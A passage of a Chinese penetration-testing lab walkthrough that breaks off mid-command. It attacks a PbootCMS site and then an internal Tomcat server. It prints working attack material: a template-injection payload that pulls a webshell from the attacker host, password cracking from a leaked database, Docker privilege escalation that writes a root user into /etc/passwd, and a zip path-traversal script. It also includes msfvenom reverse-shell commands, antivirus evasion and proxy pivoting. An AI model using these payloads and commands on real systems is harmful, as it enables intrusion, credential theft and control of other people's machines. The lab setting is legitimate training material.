href=\"#1-2环境拓扑图\" class=\"headerlink\" title=\"1.2环境拓扑图\"></a>1.2环境拓扑图</h2><p><img src=\"x2TGHLWO1BT7xC9W5af71sbv3bWIZvr2hpNb21RSq1w.png\" alt=\"image\"></p>\n<h1 id=\"2-靶场搭建\"><a href=\"#2-靶场搭建\" class=\"headerlink\" title=\"2.靶场搭建\"></a>2.靶场搭建</h1><h1 id=\"3-信息收集\"><a href=\"#3-信息收集\" class=\"headerlink\" title=\"3.信息收集\"></a>3.信息收集</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdiscover</span><br></pre></td></tr></table></figure>\n<p><img src=\"dbz5RyQ5zSD3hqX-XbVPLAUpQggdEHqbn5c9NqjDWUo.png\" alt=\"image\"></p>\n<h2 id=\"3-1masscan端口扫描\"><a href=\"#3-1masscan端口扫描\" class=\"headerlink\" title=\"3.1masscan端口扫描\"></a>3.1masscan端口扫描</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan --ports 1-65535 192.168.8.121 --rate=1000</span><br></pre></td></tr></table></figure>\n<p><img src=\"EQtcewsT1BPLIL7SJz3RiSNhbaJBrIsfSSnDwfrGh7U.png\" alt=\"image\"></p>\n<h2 id=\"3-2-nmap-端口扫描与探查\"><a href=\"#3-2-nmap-端口扫描与探查\" class=\"headerlink\" title=\"3.2. nmap 端口扫描与探查\"></a>3.2. nmap 端口扫描与探查</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sC -A -p 22,888,3306,8888,21,80 192.168.8.121 -oA port-version-8</span><br></pre></td></tr></table></figure>\n<p><img src=\"o6FPZ5jOFAI6IXcY2lsdpHszAUUOQCpbgYmEAvR_ie8.png\" alt=\"image\"></p>\n<h2 id=\"3-3-端口信息整理\"><a href=\"#3-3-端口信息整理\" class=\"headerlink\" title=\"3.3. 端口信息整理\"></a>3.3. 端口信息整理</h2><table>\n<thead>\n<tr>\n<th>端口</th>\n<th>版本信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>21</td>\n<td>Pure-FTPd</td>\n</tr>\n<tr>\n<td>22</td>\n<td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu<br>Linux; protocol   2.0</td>\n</tr>\n<tr>\n<td>80</td>\n<td>默认页面宝塔套件信息</td>\n</tr>\n<tr>\n<td>888</td>\n<td>403 Forbidden</td>\n</tr>\n<tr>\n<td>8888</td>\n<td>宝塔后台登录提示</td>\n</tr>\n<tr>\n<td>3306</td>\n<td>mysql</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-4绑定host域名\"><a href=\"#3-4绑定host域名\" class=\"headerlink\" title=\"3.4绑定host域名\"></a>3.4绑定host域名</h2><p><img src=\"jAV8b0GH5hbfW_ucYSVqbro78qQ43u4w58HdvwCW-iI.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/hosts</span><br><span class=\"line\">192.168.8.121 www.cf1.com</span><br></pre></td></tr></table></figure>\n\n\n<p>访问<a href=\"http://www.cf1.com/\">www.cf1.com</a></p>\n<p><img src=\"V9ZyKHHPY7WWKa_DbRn-ft5sNqBcKGb15KD-Fv3Z1H4.png\" alt=\"image\"></p>\n<h2 id=\"4-1-查看-cms-版本\"><a href=\"#4-1-查看-cms-版本\" class=\"headerlink\" title=\"4.1. 查看 cms 版本\"></a>4.1. 查看 cms 版本</h2><p>cms 的渗透思路</p>\n<p>确定 cms 版本 查看升级说明特别是漏洞公告然后进行文件对比定位漏洞分析漏洞与补丁</p>\n<p><a href=\"http://www.cf1.com/doc/ChangeLog.txt\">http://www.cf1.com/doc/ChangeLog.txt</a></p>\n<p><img src=\"bthrQ2C94E8rb91eZAhS3IaFD0Zx5VRwDU43giMIDos.png\" alt=\"image\"></p>\n<h2 id=\"4-2下载备份文件\"><a href=\"#4-2下载备份文件\" class=\"headerlink\" title=\"4.2下载备份文件\"></a>4.2下载备份文件</h2><p>用备份扫描器获取备份文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster <span class=\"built_in\">dir</span> -u  http://www.cf1.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x <span class=\"string\">&quot;tar.gz&quot;</span>  -t 50</span><br></pre></td></tr></table></figure>\n<p><img src=\"cxNXNXXGjwZJXcRufkE0nS1DdEbfuHrPfneMXqWkqyg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.cf1.com/config.tar.gz</span><br><span class=\"line\">http://www.cf1.com/config/database.php~</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-2-1下载-SQLITE-数据库文件\"><a href=\"#4-2-1下载-SQLITE-数据库文件\" class=\"headerlink\" title=\"4.2.1下载 SQLITE 数据库文件\"></a>4.2.1下载 SQLITE 数据库文件</h3><p>Bootcms 默认数据库是sqlite 默认下载data&#x2F;pbootcms.db</p>\n<p><img src=\"VgSqCHN1n2uHmK6nVdN79lzXsvMHn8kjkH_RXGYFZGs.png\" alt=\"image\"></p>\n<p>查看database.php发现默认db位置已经修改 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">data/c6613b090db86e60916afb3af6f923d2.db</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"4-3Sqlitebrowser-读取数据库密文\"><a href=\"#4-3Sqlitebrowser-读取数据库密文\" class=\"headerlink\" title=\"4.3Sqlitebrowser 读取数据库密文\"></a>4.3Sqlitebrowser 读取数据库密文</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlitebrowser c6613b090db86e60916afb3af6f923d2.db</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>账号</th>\n<th>密码</th>\n<th>明文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>admin</td>\n<td>8187bef2c0b83e6b0b747d92b0a65eb1</td>\n<td>admin7788</td>\n</tr>\n</tbody></table>\n<p><img src=\"Fe4iAbTN9idZjyfAAM_w0v4IJK7JF0jsQgWfbTvireg.png\" alt=\"image\"></p>\n<h2 id=\"4-4登录后台拿-WEBSHELL\"><a href=\"#4-4登录后台拿-WEBSHELL\" class=\"headerlink\" title=\"4.4登录后台拿 WEBSHELL\"></a>4.4登录后台拿 WEBSHELL</h2><p>在kali使用中国蚁剑生成一个webshell保存为garck.txt文件，密码为garck</p>\n<p>在当前目录启动一个python的web服务</p>\n<p>python3 -m http.server 80</p>\n<p><img src=\"4z_nqdz5Q4ZdLyO47k7t6HBg4HLxP9Nc-x44FY0AXlI.png\" alt=\"image\"></p>\n<p>到后台中执行下面的代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;pboot:<span class=\"keyword\">if</span>(implode(<span class=\"string\">&#x27;&#x27;</span>,[<span class=\"string\">&#x27;f&#x27;</span>,<span class=\"string\">&#x27;i&#x27;</span>,<span class=\"string\">&#x27;l&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;_&#x27;</span>,<span class=\"string\">&#x27;p&#x27;</span>,<span class=\"string\">&#x27;u&#x27;</span>.<span class=\"string\">&#x27;t&#x27;</span>,<span class=\"string\">&#x27;_c&#x27;</span>,<span class=\"string\">&#x27;o&#x27;</span>,<span class=\"string\">&#x27;n&#x27;</span>,<span class=\"string\">&#x27;t&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;n&#x27;</span>,<span class=\"string\">&#x27;t&#x27;</span>,<span class=\"string\">&#x27;s&#x27;</span>])(implode(<span class=\"string\">&#x27;&#x27;</span>,[<span class=\"string\">&#x27;3&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>]),implode(<span class=\"string\">&#x27;&#x27;</span>,[<span class=\"string\">&#x27;&lt;?php file_&#x27;</span>,<span class=\"string\">&#x27;put_&#x27;</span>,<span class=\"string\">&#x27;contents(&#x27;</span>,<span class=\"string\">&#x27;&quot;garck.php&quot;&#x27;</span>,<span class=\"string\">&#x27;,file&#x27;</span>,<span class=\"string\">&#x27;_get_&#x27;</span>,<span class=\"string\">&#x27;contents</span></span><br><span class=\"line\"><span class=\"string\">(&quot;&#x27;</span>,<span class=\"string\">&#x27;http://192.168.8.133/garck.txt&quot;));?&gt;&#x27;</span>])))&#125;!!!&#123;/pboot:<span class=\"keyword\">if</span>&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"KqZbUgpiN4A0kN28UP5Z9LBb3sZRRpzy8PQikeHJ03M.png\" alt=\"image\"></p>\n<p>访问x.php文件，就会去请求下载garck.txt文件然后再写入到garck.php文件中</p>\n<p>注意：&lt;?phpfile中php和file之间有个空格</p>\n<p>发现中国蚁剑生成的webshell连接不上，这里使用另外一个免杀的shell</p>\n<p>H:\\OLD-HP-电脑\\system\\web\\tools\\一句\\Webshell(1)\\Webshell\\PHP大马\\PHP一句话\\免杀一句话</p>\n<p>密码：dhxh8r1l9t4rdqw</p>\n<p>将webshell放入到自己的web服务器的garck.txt文件中</p>\n<p>访问报错，但是能连接成功</p>\n<p><img src=\"wU6ZUSebgdOrvC1bRgiGDAKaoAn3OIkq3Na57Lv5x24.png\" alt=\"image\"></p>\n<p><img src=\"VeckSbpwJuBDnPgjqHOjepSfTtT0z2usultPrvDa8pU.png\" alt=\"image\"></p>\n<h1 id=\"5-绕过宝塔disable-functions\"><a href=\"#5-绕过宝塔disable-functions\" class=\"headerlink\" title=\"5.绕过宝塔disable_functions\"></a>5.绕过宝塔disable_functions</h1><p><img src=\"SfNgFYNbIfFgz9suxcpU3s3q68FUV54VMwyN8qNLLm8.png\" alt=\"image\"></p>\n<p>利用 php7-backtrace-bypass <a href=\"https://github.com/mm0r1/exploits\">https://github.com/mm0r1/exploits</a></p>\n<p><img src=\"FZBTS4jPkO9wE_jdxGkEMH_PxQy6qDVp-SPnA40CFUs.png\" alt=\"image\"></p>\n<p>访问发现成功执行了uname -a</p>\n<p><img src=\"8GGftHVRqm9ZBx2yI6-OPUNgsUXLEOACPIWvip1_PpM.png\" alt=\"image\"></p>\n<p>我们给它添加一个form表单</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;form &gt;</span><br><span class=\"line\">&lt;input name=<span class=\"string\">&quot;cmd&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text&quot;</span> size=<span class=\"string\">&quot;100&quot;</span>&gt;</span><br><span class=\"line\">&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;shell&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"><span class=\"variable\">$shell</span> = isset(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])?<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]:<span class=\"string\">&#x27;uname -a&#x27;</span>;</span><br><span class=\"line\">pwn(<span class=\"string\">&quot;<span class=\"variable\">$shell</span>&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p><img src=\"HerYxDVdoq6d4vnUgHCri5osG-7YUe39Qiig2K4kuB4.png\" alt=\"image\"></p>\n<p> </p>\n<p><img src=\"ecqwi18qfLqA-N6dmU_W8JGBYzEaQUey_nro9f_eCzQ.png\" alt=\"image\"></p>\n<p><img src=\"zSTOQRrGKSspzf7yOsS5UWQrASniRgVz-Wbtsq-RgwI.png\" alt=\"image\"></p>\n<p>发现存在用户 cf1:x:1000:1000:CF1,,,:&#x2F;home&#x2F;cf1:&#x2F;bin&#x2F;bash</p>\n<p>查看其用户目录，发现了一个私钥</p>\n<p><img src=\"cwGcm5fwQ-y5_04z0Pkrko0dS6gJrdYxVVzFlVvATI8.png\" alt=\"image\"></p>\n<h1 id=\"6-通过密钥登录-SSH\"><a href=\"#6-通过密钥登录-SSH\" class=\"headerlink\" title=\"6. 通过密钥登录 SSH\"></a>6. 通过密钥登录 SSH</h1><p>使用蚁剑下载私钥到本地，然后修改权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 600 id_rsa</span><br><span class=\"line\">ssh -i id_rsa cf1@192.168.8.121</span><br><span class=\"line\">连接成功</span><br></pre></td></tr></table></figure>\n<h1 id=\"7-利用docker提权root\"><a href=\"#7-利用docker提权root\" class=\"headerlink\" title=\"7.利用docker提权root\"></a>7.利用docker提权root</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Id</span><br><span class=\"line\"><span class=\"built_in\">groups</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"3NC56PFYXYbr2y7ScpOMpoa2jnBI6UXVE2JEncQ0xAE.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -v /etc:/mnt -it alpine</span><br></pre></td></tr></table></figure>\n<p>下载不了镜像</p>\n<p><img src=\"5YRAMRoXddNvRNapOeQsZx70SeoL75qZFMpCxtL7IeU.png\" alt=\"image\"></p>\n<p>到可以下载镜像的环境，下载之后然后导出，然后上传到目标，再导入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker search alpine            <span class=\"comment\">#搜索镜像</span></span><br><span class=\"line\">sudo docker pull alpine              <span class=\"comment\">#拉取镜像</span></span><br><span class=\"line\">sudo docker image                  <span class=\"comment\">#查看镜像</span></span><br><span class=\"line\">sudo docker save alpine &gt; alpine.tar   <span class=\"comment\">#导出镜像</span></span><br><span class=\"line\"> </span><br><span class=\"line\">wget http://192.168.8.133/alpine.tar   <span class=\"comment\">#下载镜像</span></span><br><span class=\"line\">docker load &lt;alpine.tar               <span class=\"comment\">#导入镜像</span></span><br><span class=\"line\">docker images                      <span class=\"comment\">#查看镜像</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"IszhMXUkqllZjNcWwqDRS9-jWUpu6PgjznKjGV9XHiQ.png\" alt=\"image\"></p>\n<p>挂载&#x2F;etc到镜像的&#x2F;mnt，并且进入交互模式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -v /etc/:/mnt -it alpine</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /mnt</span><br><span class=\"line\"><span class=\"built_in\">cat</span> shadow</span><br></pre></td></tr></table></figure>\n<p><img src=\"OS4VMcxm8Rlj2KkZznP5Jd2dXXX5X3ntLib1kwlVliY.png\" alt=\"image\"></p>\n<p>生成一个用户的盐</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl passwd -1 --salt Garck</span><br></pre></td></tr></table></figure>\n<p>然后输入密码，输入回车之后生成盐，这里输入123456</p>\n<p><img src=\"FNJfB2vkF2codnryDu12YABoFhroxtOTh58hHMHkaBA.png\" alt=\"image\"></p>\n<p>往 passwd 增加用户信息</p>\n<p>这是root的信息：root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>\n<p>将x改成所生成的盐，然后把“&#x2F;root”删除，修改后如下</p>\n<p>garck:$1$garck$hu.Zjy0Tc&#x2F;ljqRTEvpe58.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</p>\n<p>将其添加到passwd文件中</p>\n<p>保存退出之后，切换用户，输入密码成功获得root权限</p>\n<p><img src=\"FNJfB2vkF2codnryDu12YABoFhroxtOTh58hHMHkaBA.png\" alt=\"image\"></p>\n<h1 id=\"8-渗透内网-WEB-服务器\"><a href=\"#8-渗透内网-WEB-服务器\" class=\"headerlink\" title=\"8.渗透内网 WEB 服务器\"></a>8.渗透内网 WEB 服务器</h1><h3 id=\"8-1-1-在-cf1-安装-nmap-对内网进行主机发现\"><a href=\"#8-1-1-在-cf1-安装-nmap-对内网进行主机发现\" class=\"headerlink\" title=\"8.1.1. 在 cf1 安装 nmap 对内网进行主机发现\"></a>8.1.1. 在 cf1 安装 nmap 对内网进行主机发现</h3><p>发现不能出网，查看dns的配置</p>\n<p><img src=\"L2FKYZ5lLfQC6dYNzN0WNwJ_x0YfBqeBSRYm0Es2XUQ.png\" alt=\"image\"></p>\n<p><code>root@08:/home/cf1# vi /etc/resolv.conf</code></p>\n<p><img src=\"dcyiGQHGWyQfOCoMxDdfRCG1wM7txYc0Go-JdKrtcHI.png\" alt=\"image\"></p>\n<h3 id=\"8-1-2-nmap-扫主机端口\"><a href=\"#8-1-2-nmap-扫主机端口\" class=\"headerlink\" title=\"8.1.2. nmap 扫主机端口\"></a>8.1.2. nmap 扫主机端口</h3><p>nmap -sn 192.168.0.0&#x2F;24 -T4</p>\n<p>对内网整个段主机发现</p>\n<p>apt-get install nmap</p>\n<p>nmap -sn 192.168.8.0&#x2F;24 -T4 -v</p>\n<p><img src=\"ur8T-kPENYYY1-YeOm1QZaidPgJTJ4_-gbZT9viGO9Q.png\" alt=\"image\"></p>\n<p><img src=\"ozCnXpW82kL0LXJ_0mim7oYX4iJ9biI_hTH3Ky_OHqw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -F 192.168.8.124</span><br></pre></td></tr></table></figure>\n<p><img src=\"4nBATi3agIplQwGh96CrjZqNyyQdUxoH7Kum-xs6WmA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install masscan</span><br><span class=\"line\">masscan -p 1-65535 192.168.8.124 –rate=1000</span><br><span class=\"line\">nmap -p 10129,3306,5885,8080 -sC -oA port-alls -Pn -v 192.168.8.124</span><br></pre></td></tr></table></figure>\n<p><img src=\"Se9U4q_UOyfxkZ31Tg6XCa6GHB7dTbGx988C6ICAlto.png\" alt=\"image\"></p>\n<p><img src=\"cONjAjCUeFdoQ8JM2-fVaqSAXvbSjaQpmUuUOpWPcSM.png\" alt=\"image\"></p>\n<p><img src=\"jBL6mwsTr1gsYy9KRY_9A7RKLHiPchEHEOuJy6Q6jHY.png\" alt=\"image\"></p>\n<p>访问8080端口</p>\n<p><img src=\"SeOjVTNdGN_aj-PnOvSpVMbDlMkasC337on93xE0eD0.png\" alt=\"image\"></p>\n<h2 id=\"8-2登录后台-GETHSELL\"><a href=\"#8-2登录后台-GETHSELL\" class=\"headerlink\" title=\"8.2登录后台 GETHSELL\"></a>8.2登录后台 GETHSELL</h2><p>后台弱口令 123456 </p>\n<p><a href=\"http://192.168.8.124:8080/cmscp/\">http://192.168.8.124:8080/cmscp/</a></p>\n<p>创建穿越漏洞压缩文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">import zipfile</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">     try:</span><br><span class=\"line\">         binary = b<span class=\"string\">&#x27;&lt;script&gt;alert(&quot;helloworld&quot;)&lt;/script&gt;&#x27;</span></span><br><span class=\"line\">         zipFile = zipfile.ZipFile(<span class=\"string\">&quot;test5.zip&quot;</span>, <span class=\"string\">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class=\"line\">         info = zipfile.ZipInfo(<span class=\"string\">&quot;test5.zip&quot;</span>)</span><br><span class=\"line\">         zipFile.writestr(<span class=\"string\">&quot;../../../moonsec.html&quot;</span>, binary)</span><br><span class=\"line\">         zipFile.close()</span><br><span class=\"line\">     except IOError as e:</span><br><span class=\"line\">         raise </span><br></pre></td></tr></table></figure>\n<p>上传文件解压后 没任何文件生成估计被杀软拦截了。 </p>\n<p>项目可以过杀软的 <a href=\"https://github.com/SecurityRiskAdvisors\">https://github.com/SecurityRiskAdvisors</a> </p>\n<p>上传后解压自动解压到 <a href=\"http://192.168.8.124:8080/cmd\">http://192.168.8.124:8080/cmd</a></p>\n<p>将 war 文件后门加入目录压缩包</p>\n<p><img src=\"OQW00SmyoIUYioLaNaq83vp0Ey_wfeCZpgvA18-RP1U.png\" alt=\"image\"></p>\n<p>上传文件进行解压，访问页面<a href=\"http://192.168.8.124:8080/cmd/cmd.jsp%EF%BC%8C%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8\">http://192.168.8.124:8080/cmd/cmd.jsp，文件存在</a></p>\n<p><img src=\"19pzrSB1aTORX2dUkVNTgzFLVWqRY-zxEG8WSWpY6KA.png\" alt=\"image\"></p>\n<p>修改cmd.jsp的地址</p>\n<p><img src=\"AgKP1HEZ8OFutwS4jeJQ98zs85IShpxPXo7cDLc9Dzc.png\" alt=\"image\"></p>\n<p>在一个web目录下新建一个111.html的文件，其内容如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> src=<span class=\"string\">&quot;a.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>同时将刚才修改好的a.js的文件也放到同一目录下，最后访问111.html文件，如下效果</p>\n<p><img src=\"PCQAQNcZytB5gl6nSvtYN2LPRHPStI5bC0cB8hlh7RI.png\" alt=\"image\"></p>\n<p>执行whoami的效果，成功getshell</p>\n<p><img src=\"aFhs0hhajqWl0uQvJ8mFPvRos0OnOzwmMcHVCQ07pjo.png\" alt=\"image\"></p>\n<p>能够执行命令了 但是执行其他命令失败 上传文件也失败</p>\n<h2 id=\"8-3metasploit-生成-jsp-shell\"><a href=\"#8-3metasploit-生成-jsp-shell\" class=\"headerlink\" title=\"8.3metasploit 生成 jsp shell\"></a>8.3metasploit 生成 jsp shell</h2><p>网上很多 war 都被系统自带的杀软查刚好发现 msf 自带得 jsp 可以绕过。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.8.133 LPORT=8888 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>\n<p>打包成shell.war，然后同样放到压缩包中，然后上传解压</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure>\n<p>打开msf，进行监听</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler </span><br><span class=\"line\"><span class=\"built_in\">set</span> payload java/jsp_shell_reverse_tcp </span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 8888</span><br><span class=\"line\"><span class=\"built_in\">set</span> shell cmd.exe</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"IHXj9eZlmA-ULmvL0dCen6T9kG1cGORRFQfMnh5JMMc.png\" alt=\"image\"></p>\n<p>得到 seesion 权限是管理员</p>\n<p><img src=\"ZnCFBq2KPcrIJvC_r609jdxpoM4C43Gp6bCqvgr0xyo.png\" alt=\"image\"></p>\n<h2 id=\"8-4生成免杀-bypassAV\"><a href=\"#8-4生成免杀-bypassAV\" class=\"headerlink\" title=\"8.4生成免杀 bypassAV\"></a>8.4生成免杀 bypassAV</h2><p>简单收集一下进行发现存在数个杀软</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net start</span><br></pre></td></tr></table></figure>\n<p><img src=\"WkM4R5P_WTWFbpbU-lseszvkMPHvv5j4B3vQUdfQUlE.png\" alt=\"image\"></p>\n<p><img src=\"E4uvPLZKY6pF6v4OsxOd_cbH8Fz8BzWsu_iCpw8jHv8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">tasklist | find /i <span class=\"string\">&quot;360&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"7J1w8yaf6H2pj0sA4TKt84Gt526U42sSP-nWmCK1Q_E.png\" alt=\"image\"></p>\n<p>生成免杀 bypassAV </p>\n<p>简单收集一下进行发现存在数个杀软</p>\n<p>使用CS生成一个C#的payload，结合免杀加载器进行生成一个木马</p>\n<p><img src=\"HfH2t7t5nZUbptnAsVWaCHxOCo7xDobxCG8PkHiEcFc.png\" alt=\"image\"></p>\n<p>同样是放入到压缩文件中，压缩之后进行上传，然后点击解压，会解压到C:\\tomcat\\webapps</p>\n<p><img src=\"H3lAJ65FmBPm3y7MkxAhrzTYTnX5NoQAGSoC-jez2C8.png\" alt=\"image\"></p>\n<p>下面开始执行</p>\n<p>生成的 exe 目前可以过 defender 和 360 全套</p>\n<p>但是执行没有返回 shell 估计是被行</p>\n<p><img src=\"B5LSR0yGV6ASjdX61XdR9nbHedfztNxu2V_L53RBLgc.png\" alt=\"image\"></p>\n<p>研究了一下过了(这里先添加到信任区，后面再自行研究免杀)</p>\n<p> </p>\n<p><img src=\"xl2EmhazH-YTdnkJ5NHG9SOmnPUFVTV_dv687EwdLW4.png\" alt=\"image\"></p>\n<h1 id=\"9-对-tomcat-web-内网服务器信息收集\"><a href=\"#9-对-tomcat-web-内网服务器信息收集\" class=\"headerlink\" title=\"9.对 tomcat-web 内网服务器信息收集\"></a>9.对 tomcat-web 内网服务器信息收集</h1><p><img src=\"8pA-osl3znaQ6OFSXCI6irM70k8KFOABq6Ys_a1QJBQ.png\" alt=\"image\"></p>\n<p><img src=\"PZ6UB0uxscA4zLnHAmQ5QRgEOyCnrHYWHF4X_inLRV4.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">portscan 10.10.1.0-10.10.1.255 139 arp 1024</span><br></pre></td></tr></table></figure>\n<p><img src=\"al00tm8j0Ml3CDMCURAhO_u1tggQvYTuxDqAFCF6jCs.png\" alt=\"image\"></p>\n<h2 id=\"9-1MSF-后门-Bypass-defende\"><a href=\"#9-1MSF-后门-Bypass-defende\" class=\"headerlink\" title=\"9.1MSF 后门 Bypass defende\"></a>9.1MSF 后门 Bypass defende</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.133 LPORT=2333 -e x86/shikata_ga_nai -i 15 -f csharp -o payload-re.txt</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 2333 </span><br></pre></td></tr></table></figure>\n<p>在CS中上传和运行</p>\n<p><img src=\"TS6aUkE0Ve8hpKdBptzKkxw3dFx8ORO_NPzJ8CTu8Dw.png\" alt=\"image\"></p>\n<p><img src=\"sffaJu03-n87r8ceAsbKxk_rp4C-hrFIQg6qjxJayzM.png\" alt=\"image\"></p>\n<p>现在可以在 metasploit下操作了 </p>\n<p>添加路由 开启 socks5</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\"><span class=\"built_in\">set</span> srvport 3333</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"q9UMkpbvGi0pi_ECQlUolhbgT8jUxpTIkIcKO9eLO7E.png\" alt=\"image\"></p>\n<h2 id=\"9-2-防火墙拦截\"><a href=\"#9-2-防火墙拦截\" class=\"headerlink\" title=\"9.2. 防火墙拦截\"></a>9.2. 防火墙拦截</h2><p>nmap 对 10.10.1.128 对其端口扫描 </p>\n<p>proxychains nmap -sT -Pn 10.10.1.128 -p 139,445</p>\n<p> 445端口没扫出来</p>\n<p><img src=\"Ts7VPDJuhAiSmFsDhq1oOq6QWKg5GnJHuXC5e4_RlsQ.png\" alt=\"image\"></p>\n<p>在CS使用ARP扫描</p>\n<p><img src=\"h8lXqfRU1nI4_xxY4V4kWI-GZgfTBpwkr7P2Jbii3wE.png\" alt=\"image\"></p>\n<h2 id=\"9-3ipc-空链接\"><a href=\"#9-3ipc-空链接\" class=\"headerlink\" title=\"9.3ipc 空链接\"></a>9.3ipc 空链接</h2><p>访问 FILESERVER 服务器</p>\n<p><img src=\"UzHAtSBBACGagdRshrDnV-7HYiyN-G5US-Pa0usKShc.png\" alt=\"image\"></p>\n<p>可以访问到文件服务器。</p>\n<p><img src=\"GoRM_1A3PR9TkfMLMErUG39giP3CqZdAHz2aM7C739U.png\" alt=\"image\"></p>\n<h1 id=\"10-metasploit-shellcode-免杀\"><a href=\"#10-metasploit-shellcode-免杀\" class=\"headerlink\" title=\"10.metasploit shellcode 免杀\"></a>10.metasploit shellcode 免杀</h1><h2 id=\"10-1开启-tomcat-服务器远程桌面\"><a href=\"#10-1开启-tomcat-服务器远程桌面\" class=\"headerlink\" title=\"10.1开启 tomcat 服务器远程桌面\"></a>10.1开启 tomcat 服务器远程桌面</h2><p>run getgui -e</p>\n<p><img src=\"LqDVMBms5S9ABSPfUrOecrqYMkjvwq8AbjQaP9Na6OU.png\" alt=\"image\"></p>\n<h2 id=\"10-2-绕过-CredSSP-错误信息\"><a href=\"#10-2-绕过-CredSSP-错误信息\" class=\"headerlink\" title=\"10.2. 绕过 CredSSP 错误信息\"></a>10.2. 绕过 CredSSP 错误信息</h2><p><img src=\"-KnSrJtGCPeAKSbzEz-aLSVAbqTyvXVPxg6KxX0dDyU.png\" alt=\"image\"></p>\n<p>没办法连接，估计是被拦截了，下面把目标的3389转发到本地</p>\n<p>portfwd add -l 3389 